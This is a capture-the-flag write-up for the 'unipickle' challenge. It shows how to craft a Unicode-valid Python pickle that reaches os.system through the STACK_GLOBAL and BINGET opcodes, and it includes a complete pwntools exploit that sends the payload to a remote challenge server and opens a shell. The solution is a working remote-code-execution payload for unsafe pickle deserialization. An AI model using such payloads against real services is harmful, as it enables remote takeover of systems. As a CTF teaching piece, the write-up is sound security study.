# unipickle

i was able to get a first blood!!! so happy about that because i have been working with pickle for so long now if i did not get first blood i would've been so disappointed in myself

## problem

```py
#!/usr/local/bin/python
import pickle
pickle.loads(input("pickle: ").split()[0].encode())
```

(standard pickle chall, but all chars must be unicode encodable)

# solution

we can look at [pickle.py](https://github.com/python/cpython/blob/3.10/Lib/pickle.py) in the python source code and see what opcodes are unicode-friendly

notably, the `STACK_GLOBAL` opcode is not unicode friendly by itself (it uses the `\x93` byte)

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/146ed390-c045-4899-badc-50cccda4d6a3)

`GLOBAL` and `INST`, the other two ways to get arbitrary classes, are not possible because the `.split()[0]` in the problem makes it impossible to have any tabs, spaces, or newlines. both of these opcodes require newlines to pass in arguments for the opcodes, so this is not possible.

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/0acfd359-c244-4c3b-8cbe-a38393418651)

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/fe702141-ace4-423b-bd96-b5fd28a1de04)

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/a9993495-5150-4f70-a5ad-be83515601bf)

therefore, we must find a way to use `STACK_GLOBAL`

we can get access to it by throwing away an arbitrary byte that is attached before it to make it valid unicode. notably, `b'\xc7\x93'` is a valid unicode character, for some reason. so, if we can discard the c7 byte, we can achieve RCE

i found that out by enumerating over a large range of integers (like 0 to 20000) and using chr() and decoding and encoding it to see if it sticked, and also only outputting the ones that have `\x93` byte in them

```py
for v in range(20000):
    if b'\x93' in chr(v).encode('utf-8'):
        print(v, chr(v).encode('utf-8'))
```

then, we can discard the `\xc7` by using `BINGET`, which takes a byte argument and retrieves the item assigned to byte c7 from memo and puts it on the stack. 

in this case, the item was `"system"`, and the previous item on the stack was `"os"`, so stack global gets us os.system

therefore, we can use `STACK_GLOBAL` to produce os.system, and then we can spawn a shell.

```py
from pwn import *
from pickle import *

p = remote("mc.ax", 31773)

bs = lambda _: SHORT_BINSTRING + int.to_bytes(len(_), 1, 'big') + b"" + _.encode() + b""

q = (bs('os') + bs('system') + BINPUT + b'\xc7\x88' + POP + POP + BINGET + b'\xc7\x93' + MARK + bs('sh') + TUPLE + REDUCE + STOP)

print(q)
print(q.split())

p.sendline(q)

p.interactive()
```

also, we had to use `SHORT_BINSTRING` because it uses all unicode-compliant characters (we cannot use binunicode opcode because it requires `\n` iirc)

also, we don't need `PROTO` because it is assumed as 0, which is fine i guess

what the payload does to the stack and memo is below

```
bs('os') + bs('system') + BINPUT + b'\xc7' + '\x88' + POP + POP + BINGET + b'\xc7' + '\x93' + MARK + bs('sh') + TUPLE + REDUCE + STOP
=====================
start of pickle
["os"] {} - put os on the stack
["os", "system"] {} - put system on the stack
["os", "system"] {199: "system"} - store system at 0xc7 in memo
["os", "system", True] {199: "system"} - put True on the stack to make the 0xc7 compliant with unicode
["os", "system"] {199: "system"} - pop the unnecessary True
["os"] {199: "system"} - pop system since we have to binget it later
["os", "system"] {199: "system"} - binget system in memo at 0xc7
[os.system] {199: "system"} - stack global with another byte for unicode compliance
[os.system, MARK] {199: "system"} - put MARK on the stack (we cannot use TUPLE1, but we can use TUPLE opcode)
[os.system, MARK, "sh"] {199: "system"} - put sh on the stack
[os.system, ("sh",)] {199: "system"} - put sh into a tuple by itself
[None] {199: "system"} - execute the payload
end of pickle
```

took me about 20 minutes to first blood it when i first saw the challenge, but it was a bit after the ctf started and somehow i was able to firstblood it still

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/517144e2-695b-438e-8272-a3df9788e0ec)
